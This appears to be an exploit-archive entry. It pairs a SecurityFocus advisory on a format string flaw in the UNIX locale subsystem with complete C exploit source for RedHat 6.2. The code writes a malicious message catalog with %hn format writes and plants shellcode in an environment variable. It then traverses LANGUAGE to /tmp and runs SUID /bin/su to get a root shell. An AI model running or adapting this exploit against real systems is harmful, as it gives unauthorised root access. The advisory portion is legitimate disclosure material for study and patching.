Conectiva 4.x/5.x,Debian 2.x,IBM AIX 3.x/4.x,Mandrake 7,RedHat 5.x/6.x,IRIX 6.x, Solaris 2.x/7/8,Turbolinux 6.x,Wirex Immunix OS 6.2 Locale Subsystem Format String

source: http://www.securityfocus.com/bid/1634/info

Many UNIX operating systems provide internationalization support according to the X/Open XPG3, XPG4 and Sun/Uniforum specifications using the of the locale subsystem. The locale subsystem comprises a set of databases that store language and country specific information and a set of library functions used to store, retrieve and generally manage that information.

In particular a database with messages used by almost all the operating system programs is keep for each supported language.

The programs access this database using the gettext(3), dgettext(3), dcgettext(3) C functions (Sun/Uniforum specifications) or catopen(3), catgets(3) and catclose(3) ( X/Open XPG3 and XPG4 specification).

Generally a program that needs to display a message to the user will obtain the proper language specific string from the database using the original message as the search key and printing the results using the printf(3) family of functions. By building and installing a custom messages database an attacker can control the output of the message retrieval functions that get feed to the printf(3) functions.

Bad coding practices and the ability to feed format strings to the later functions makes it possible for an attacker to execute arbitrary code as a privileged user (root) using almost any SUID program on the vulnerable systems.

Alternatively, on some operating systems, the problem can be exploited remotely using the environment variable passing options in telnetd. However, a remote attacker must be able to place the suitable messages database on the target host (i.e. anonymous ftp, NFS, email, etc.)

It should be noted under Linux this problem must be exploited in conjunction with a another flaw in glibc. On RedHat systems, it is possible to evade the protection built-into libc that patches this vulnerability and exploit userhelper to gain root access. RedHat has released packages to fix this vulnerability.


/* exploit for glibc/locale format strings bug.
 * Tested in RedHat 6.2 with kernel 2.2.16.
 * Script kiddies: you should modify this code
 * slightly by yourself. :)
 *
 * Greets: Solar Designer, Jouko Pynnvnen , zenith parsec
 *
 * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN
 * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.
 *
 *           by warning3@nsfocus.com (http://www.nsfocus.com)
 *                                     y2k/9/6
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define DEFAULT_OFFSET                  550
#define DEFAULT_ALIGNMENT                 2
#define DEFAULT_RETLOC           0xbfffd2ff
#define DEFAULT_BUFFER_SIZE            2048
#define DEFAULT_EGG_SIZE               1024
#define NOP                            0x90
#define PATH             "/tmp/LC_MESSAGES"

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}


 main(int argc, char *argv[]) {
  char *buff, *buff1, *ptr, *egg;
  char *env[3];
  long shell_addr,retloc=DEFAULT_RETLOC,tmpaddr;
  int offset=DEFAULT_OFFSET, align=DEFAULT_ALIGNMENT;
  int bsize=DEFAULT_BUFFER_SIZE, eggsize=DEFAULT_EGG_SIZE;
  int i,reth,retl,num=113;
  FILE *fp;

  if (argc > 1) sscanf(argv[1],"%x",&retloc);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) num = atoi(argv[3]);
  if (argc > 4) align = atoi(argv[4]);
  if (argc > 5) bsize   = atoi(argv[5]);
  if (argc > 6) eggsize = atoi(argv[6]);



  printf("Usages: %s <RETloc> <offset> <num> <align> <buffsize> <eggsize> \n",argv[0]);

  if (!(buff = malloc(eggsize))) {
       printf("Can't allocate memory.\n");
       exit(0);
    }


  if (!(buff1 = malloc(bsize))) {
       printf("Can't allocate memory.\n");
       exit(0);
    }

  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

    printf("Using RET location address: 0x%x\n", retloc);
    shell_addr = get_esp() + offset;
    printf("Using Shellcode address: 0x%x\n", shell_addr);

    reth = (shell_addr >> 16) & 0xffff ;
    retl = (shell_addr >>  0) & 0xffff ;

    ptr = buff;

    for (i = 0; i <2 ; i++, retloc+=2 ){
       memset(ptr,'A',4);
       ptr += 4 ;
       (*ptr++) =  retloc & 0xff;
       (*ptr++) = (retloc >> 8  ) & 0xff ;
       (*ptr++) = (retloc >> 16 ) & 0xff ;
       (*ptr++) = (retloc >> 24 ) & 0xff ;
      }

     memset(ptr,'A',align);

     ptr = buff1;

     for(i = 0 ; i < num ; i++ )
     {
        memcpy(ptr, "%.8x", 4);
        ptr += 4;
     }

     sprintf(ptr, "%%%uc%%hn%%%uc%%hn",(retl - num*8),
              (0x10000 + reth - retl));


    mkdir(PATH,0755);
    chdir(PATH);
    fp = fopen("libc.po", "w+");
    fprintf(fp,"msgid \"%%s: invalid option -- %%c\\n\"\n");
    fprintf(fp,"msgstr \"%s\\n\"", buff1);
    fclose(fp);
    system("/usr/bin/msgfmt libc.po -o libc.mo");


    ptr = egg;
    for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
      *(ptr++) = NOP;

    for (i = 0; i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

    egg[eggsize - 1] = '\0';

    memcpy(egg, "EGG=", 4);
    env[0] = egg ;
    env[1] = "LANGUAGE=sk_SK/../../../../../../tmp";
    env[2] = (char *)0 ;

    execle("/bin/su","su","-u", buff, NULL,env);

}  /* end of main */